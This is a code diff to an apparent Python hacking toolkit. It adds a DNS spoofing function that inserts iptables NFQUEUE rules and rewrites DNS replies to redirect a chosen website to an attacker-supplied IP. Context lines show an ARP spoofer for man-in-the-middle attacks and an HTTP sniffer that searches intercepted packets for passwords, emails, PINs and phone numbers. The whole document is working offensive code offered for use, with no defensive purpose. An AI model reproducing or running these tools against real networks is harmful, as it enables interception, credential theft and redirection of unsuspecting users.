@@ -12,6 +12,7 @@ import re
 import scapy.all as scapy
 import time
 import scapy_http.http as http
+import netfilterqueue
 def encryption_fernet():
     decrpt_or_encrpt = input('do you want to decrypt or encrypt the file(e/d):')
     if decrpt_or_encrpt == 'e':
@@ -149,9 +150,9 @@ def arp_spoof():
     sent_packets = 0
     target_ip = input('enter target ip:')
     router_ip= input('enter router ip:')
-    print(Fore.LIGHTBLUE_EX," note:use packet sniffer with it for intercepting and viwing all packets")
+    print(Fore.LIGHTBLUE_EX,' note:use packet sniffer with it for intercepting and viwing all packets')
     def get_mac(ip):
-        mac = "xx"
+        mac = 'xx'
         try:
             arp_request = scapy.ARP(pdst=ip)
             broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
@@ -184,13 +185,15 @@ def arp_spoof():
         restore(router_ip, target_ip)
         print(Fore.LIGHTRED_EX,'\n[-] detected CTRL + C... EXITING')
 
+    
+    
 
 
 def packet_sniffer():
-    print(Fore.LIGHTBLUE_EX,"NOTE:while used without a mitm(man in the middle attack) running, this will only scan packets from your device, use with arpspoofer(in this tool set) for good results")
+    print(Fore.LIGHTBLUE_EX,'NOTE:while used without a mitm(man in the middle attack) running, this will only scan packets from your device, use with arpspoofer(in this tool set) for good results')
     print(Fore.RED, 'NOTE: THIS IS FOR HTTP SITES ONLY, AND SCANS ONLY HTTP LAYERS,will add https bypassing soon')
     print(Fore.GREEN, '-')
-    interface = input("enter the interface you want to sniff:")
+    interface = input('enter the interface you want to sniff:')
     print(Fore.LIGHTMAGENTA_EX, '-')
     def process_packet(packet):
         if packet.haslayer(http.HTTPRequest):
@@ -200,7 +203,7 @@ def packet_sniffer():
     
             if packet.haslayer(scapy.Raw):
                 load = packet[scapy.Raw].load
-                keyword = ["email", "password", 'unames', "username", "pass", 'passcode', 'pin', ' phno', 'phone']
+                keyword = ['email', 'password', 'unames', 'username', 'pass', 'passcode', 'pin', ' phno', 'phone']
                 for i in keyword:
                     if i.encode() in load:
                         print(Fore.GREEN, '-')
@@ -208,7 +211,41 @@ def packet_sniffer():
                         print(Fore.MAGENTA, '-')
 
     scapy.sniff(iface=interface, store=False, prn=process_packet)
- 
+def dns_spoof():
+
+    key_website = bytes(input("enter the website u wanna redirect:"),  'utf-8')
+    redirect_ip = input("enter ip you wanna redirect to:")
+    que_num = int(input("enter queue number(for ip tables, if you dont know what to do, enter 3):"))
+    print("IF AFTER QUITING THE PROGRAM, YOUR NETWORK CONECTIVITY GOES DOWN, RUN iptables -F")
+    def process_packet(packet):
+        scapy_packet = scapy.IP(packet.get_payload())
+        if scapy_packet.haslayer(scapy.DNSRR):
+            qname = scapy_packet[scapy.DNSQR].qname    
+            if  key_website in qname:
+                print("[+] Spoofing Target")
+                answer = scapy.DNSRR(rrname=qname, rdata=redirect_ip)
+                scapy_packet[scapy.DNS].an = answer
+                scapy_packet[scapy.DNS].ancount = 1
+    
+                del scapy_packet[scapy.IP].len
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.UDP].chksum
+                del scapy_packet[scapy.UDP].len
+    
+                packet.set_payload(bytes(scapy_packet))
+    
+    
+        packet.accept()
+    os.system('iptables -I OUTPUT -j NFQUEUE --queue-num {}'.format(que_num))
+    os.system('iptables -I INPUT -j NFQUEUE --queue-num {}'.format(que_num)) 
+    os.system('iptables -I FORWARD -j NFQUEUE --queue-num {}'.format(que_num)) 
+    try:
+        queue = netfilterqueue.NetfilterQueue()
+        queue.bind(que_num, process_packet)
+        queue.run()
+    except:
+        os.system('iptables -F')
+        print("CTRL + C detected, flushing ip table and cleaning things up")
 try:
     while True:
         print(Fore.LIGHTYELLOW_EX, '-------------------------------------')
@@ -220,6 +257,7 @@ try:
         print(Fore.LIGHTGREEN_EX,'6. network scanner')
         print(Fore.LIGHTGREEN_EX, '7. arp spoofer')
         print(Fore.LIGHTGREEN_EX, '8.packet sniffer')
+        print(Fore.LIGHTGREEN_EX, '9. dns spoof(allows you to redirect websites)')
         print(Fore.LIGHTRED_EX,'input exit to exit')
         print(Fore.LIGHTGREEN_EX,'-')
         
@@ -236,10 +274,12 @@ try:
             mac_changer()
         elif inpt == '6':
             network_scanner()
-        elif inpt == "7":
+        elif inpt == '7':
             arp_spoof()
         elif inpt == '8':
             packet_sniffer()
+        elif inpt == '9':
+            dns_spoof()
         elif inpt == 'exit':
             print(Fore.LIGHTRED_EX, 'cya!')
             break
